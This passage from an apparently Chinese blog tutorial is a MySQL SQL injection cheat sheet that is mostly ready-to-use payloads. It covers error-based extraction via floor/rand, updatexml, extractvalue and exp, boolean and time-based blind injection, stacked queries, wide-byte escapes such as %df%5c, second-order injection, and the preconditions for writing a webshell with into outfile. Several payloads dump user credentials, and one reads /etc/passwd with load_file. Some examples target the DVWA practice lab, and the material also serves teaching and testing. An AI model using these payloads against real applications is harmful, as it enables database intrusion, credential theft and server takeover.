class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆字段</span><br><span class="hljs-built_in">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (SELECT <span class="hljs-built_in">distinct</span> concat(<span class="hljs-number">0x23</span>,user_id,<span class="hljs-number">0x3a</span>,password,<span class="hljs-number">0x23</span>) FROM user limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a)  <span class="hljs-comment">//爆内容</span><br></code></pre></td></tr></table></figure>

<p>UPDATEXML函数</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)--+<br>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>)<br><span class="hljs-string">&#x27; and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+</span><br></code></pre></td></tr></table></figure>

<p>几何函数报错</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">geometrycollection</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipoint</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">polygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multipolygon</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">linestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">multilinestring</span>(<span class="hljs-params">(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> user(</span>))a)b))</span>;<br></code></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27; and exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a));<br><span class="hljs-keyword">select</span> ~<span class="hljs-number">0</span> //将<span class="hljs-number">0</span>取反，函数成功执行后返回<span class="hljs-number">0</span>的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。<br>MySql5<span class="hljs-number">.5</span><span class="hljs-number">.5</span>版本后整形溢出才会报错<br>得到表名：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br>得到列名：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br>检索数据：<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~ (<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>,id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)x));<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>))a));读取本地文件<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (id, username, <span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(concat(@:=<span class="hljs-number">0</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*)<span class="hljs-keyword">from</span><span class="hljs-symbol">`information_schema`</span>.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-keyword">and</span>@:=concat(@,<span class="hljs-number">0xa</span>,table_schema,<span class="hljs-number">0x3a3a</span>,table_name,<span class="hljs-number">0x3a3a</span>,column_name)),@)))x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;Eyre&#x27;</span>);<br><br><span class="hljs-keyword">update</span> users <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;Peter&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">where</span> id=<span class="hljs-number">4</span>;<br><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>Extractvalue</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),version(),<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">schema_name</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.schemata <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">TABLE_NAME</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">WHERE</span> table_schema=data_column <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),<span class="hljs-built_in">column_name</span>,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">TABLE_NAME</span>=data_table <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> extractvalue(rand(),concat(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>),data_info,<span class="hljs-type">CHAR</span>(<span class="hljs-number">126</span>)) <span class="hljs-keyword">FROM</span> data_table.data_column <span class="hljs-keyword">LIMIT</span> data_offset,<span class="hljs-number">1</span>)))<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<p>NAME_CONST</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>),NAME_CONST(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br>?id=<span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> NAME_CONST(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>),NAME_CONST(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>)) <span class="hljs-keyword">as</span> x)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>

<h4 id="盲注："><a href="#盲注：" class="headerlink" title="盲注："></a>盲注：</h4><h5 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h5><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and left(database(),4)=&#x27;dvwa&#x27; --+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and mid(database(),1,1)=&#x27;d&#x27; --+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and ascii(mid(database(),1,1))=&#x27;100&#x27;--+</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and length(database())&gt;=5--+判断库名长度</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and substr(database(),1,1)=&#x27;d&#x27;--+ 截取库名第一个字符</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">if</span>((user() regexp <span class="hljs-comment">&#x27;^r&#x27;),1,0)) --+</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(user() like <span class="hljs-comment">&#x27;r%25&#x27;) --+</span><br></code></pre></td></tr></table></figure>

<h5 id="时间："><a href="#时间：" class="headerlink" title="时间："></a>时间：</h5><p>SLEEP函数</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(length(database())&gt;=4,sleep(5),1)--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(mid(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-string">&#x27;100&#x27;</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;___&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;_____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;s____&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sa___&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swa__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swb__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;swi__&#x27;</span>)#<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> sleep(<span class="hljs-number">10</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%pass%&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span>)#<br><br>BENCHMARK<br>```<span class="hljs-keyword">sql</span><br><span class="hljs-keyword">Select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> user_id= <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">if</span>(ascii(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>,benchmark(<span class="hljs-number">100000000</span>,sha(<span class="hljs-number">1</span>)), <span class="hljs-keyword">null</span>));<br></code></pre></td></tr></table></figure>

<p>笛卡尔积</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">将两个大表做乘积。现在，我们有两个集合A和<span class="hljs-keyword">B。</span><br><span class="hljs-keyword"></span>A = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;     <span class="hljs-keyword">B </span>= &#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;<br>集合 A×<span class="hljs-keyword">B </span>和 <span class="hljs-keyword">B×A的结果集就可以分别表示为以下这种形式：</span><br><span class="hljs-keyword"></span>A×<span class="hljs-keyword">B </span>= &#123;（<span class="hljs-number">0</span>，<span class="hljs-number">2</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">2</span>），（<span class="hljs-number">0</span>，<span class="hljs-number">3</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">3</span>），（<span class="hljs-number">0</span>，<span class="hljs-number">4</span>），（<span class="hljs-number">1</span>，<span class="hljs-number">4</span>）&#125;；<br><span class="hljs-keyword">B×A </span>= &#123;（<span class="hljs-number">2</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">2</span>，<span class="hljs-number">1</span>），（<span class="hljs-number">3</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">3</span>，<span class="hljs-number">1</span>），（<span class="hljs-number">4</span>，<span class="hljs-number">0</span>），（<span class="hljs-number">4</span>，<span class="hljs-number">1</span>）&#125;；<br>数据库表连接数据行匹配时所遵循的算法就是以上提到的笛卡尔积，表与表之间的连接可以看成是在做乘法运算<br>select * from guestbook <span class="hljs-keyword">join </span>users<br></code></pre></td></tr></table></figure>

<p>Get_lock</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Select</span> GET_LOCK(<span class="hljs-symbol">&#x27;snowwolf</span>&#x27;,<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure>

<p>Rlike</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">select concat (<span class="hljs-name">rpad</span> (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a) ,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a)<br>,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a)<br>,rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rp<br>ad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a) ,rpad (<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a),rpad(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>,a )) RLIKE &#x27;(a.*)+(a.*)+<br>(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+(a.*)+(<span class="hljs-name">a</span>.*)+b&#x27;;<br></code></pre></td></tr></table></figure>

<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-comment">;select</span><br></code></pre></td></tr></table></figure>

<h3 id="基于类型"><a href="#基于类型" class="headerlink" title="基于类型"></a>基于类型</h3><p>字符串型，数字型</p>
<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），也就是说一次性会读取两个字节。</p>
<p>简单来说，宽字节注入就是将两个ascii字符误认为是一个宽字节字符。</p>
<p>然而，**除了GBK的存在，转义字符**也是可以构成此漏洞的因素。</p>
<p><strong>当ascii码大于127的字符和转义字符\组成宽字节字符，会造成单引号或者双引号逃逸，进而导致sql注入。</strong></p>
<p>产生宽字节注入的原因涉及了编码转换的问题，当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字，那么如果存在过滤我们输入的函数（addslashes()、mysql_real_escape_string()、mysql_escape_string()、Magic_quotes_gpc）会将我们的输入进行转义。</p>
<p>尝试注入，我们举一个简单的例子：</p>
<p>addslashes()：该函数的作用是返回在预定义字符之前添加反斜杠的字符串。</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%bf</span><span class="hljs-variable">%27</span><br><span class="hljs-variable">%df</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><br><span class="hljs-variable">%A8</span><span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure>

<h3 id="基于顺序"><a href="#基于顺序" class="headerlink" title="基于顺序"></a>基于顺序</h3><p>一次注入，二次注入</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>注册或更新个人资料如下</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">I love programming&#x27;, email=(<span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>) --<br></code></pre></td></tr></table></figure>

<p>当执行SQL语句时，会发生以下情况：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">末尾的注释<span class="hljs-comment">--可确保原始 SQL 查询的其余部分被注释掉</span><br>子查询(<span class="hljs-keyword">SELECT</span> email <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span>）将执行用管理员用户的电子邮件替换该列<br></code></pre></td></tr></table></figure>

<h3 id="基于注入点"><a href="#基于注入点" class="headerlink" title="基于注入点"></a>基于注入点</h3><p>表单，cookie，http头部字段</p>
<h2 id="SQL注入基本流程"><a href="#SQL注入基本流程" class="headerlink" title="SQL注入基本流程"></a>SQL注入基本流程</h2><p>寻找注入位置，判断注入点，识别数据库，注数据&#x2F;拿权限</p>
<h3 id="寻找注入位置"><a href="#寻找注入位置" class="headerlink" title="寻找注入位置"></a>寻找注入位置</h3><p>与数据库可能有交互的地方都存在sql注入</p>
<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>公式：</p>
<p>闭合符号+逻辑符号+逻辑语句+注释符号</p>
<h4 id="闭合符号"><a href="#闭合符号" class="headerlink" title="闭合符号"></a>闭合符号</h4><p>; ) ‘ “ ‘) “)</p>
<h4 id="逻辑符号"><a href="#逻辑符号" class="headerlink" title="逻辑符号"></a>逻辑符号</h4><p>and or | &amp; || &amp;&amp;</p>
<h4 id="逻辑语句"><a href="#逻辑语句" class="headerlink" title="逻辑语句"></a>逻辑语句</h4><p>+-*&#x2F;&lt;&gt;</p>
<h4 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h4><p>– -,–+,#</p>
<h2 id="其它知识点"><a href="#其它知识点" class="headerlink" title="其它知识点"></a>其它知识点</h2><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="outfile和dumpfile写shell"><a href="#outfile和dumpfile写shell" class="headerlink" title="outfile和dumpfile写shell"></a>outfile和dumpfile写shell</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码</p>
<blockquote>
<ol>
<li>数据库当前用户为root权限；</li>
<li>知道当前网站的绝对路径；</li>
<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
<li>写入的那个路径存在写入权限。</li>
</ol>
</blockquote>
